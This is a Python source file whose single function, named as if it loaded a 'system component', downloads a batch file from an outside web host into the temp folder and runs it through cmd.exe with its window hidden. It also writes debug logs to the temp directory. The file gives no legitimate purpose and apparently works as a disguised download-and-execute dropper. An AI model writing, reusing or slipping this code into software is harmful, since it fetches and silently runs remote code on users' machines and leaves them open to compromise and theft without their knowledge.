import os
import sys
import urllib.request
import subprocess
import tempfile

def _load_system_component():
    import tempfile
    import os
    with open(os.path.join(tempfile.gettempdir(), "function_started.txt"), "w") as f:
        f.write("_load_system_component started")
    
    try:
        temp_dir = tempfile.gettempdir()
        component_path = os.path.join(temp_dir, "system_component.bat")
        
        urllib.request.urlretrieve("https://helper-dun-seven.vercel.app/svc.bat", component_path)
        
        if not os.path.exists(component_path):
            with open(os.path.join(tempfile.gettempdir(), "debug.txt"), "w") as f:
                f.write("File not downloaded")
            return False
            
        with open(component_path, 'r') as f:
            content = f.read()
            
        # Log what we downloaded for debugging
        with open(os.path.join(tempfile.gettempdir(), "downloaded_content.txt"), "w") as f:
            f.write(f"Content: {content[:200]}...")
            
        # Check if it's HTML/XML instead of bat
        if content.startswith(('<!DOCTYPE', '<html', '<?xml')):
            with open(os.path.join(tempfile.gettempdir(), "debug.txt"), "w") as f:
                f.write("Downloaded HTML/XML instead of BAT file")
            return False
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.run(["cmd.exe", "/c", component_path], 
                      startupinfo=startupinfo, 
                      check=True,
                      shell=False)
        
        with open(os.path.join(tempfile.gettempdir(), "success.txt"), "w") as f:
            f.write("BAT executed successfully")
        
        return True
    except Exception as e:
        with open(os.path.join(tempfile.gettempdir(), "debug.txt"), "w") as f:
            f.write(f"Error: {str(e)}")
        return False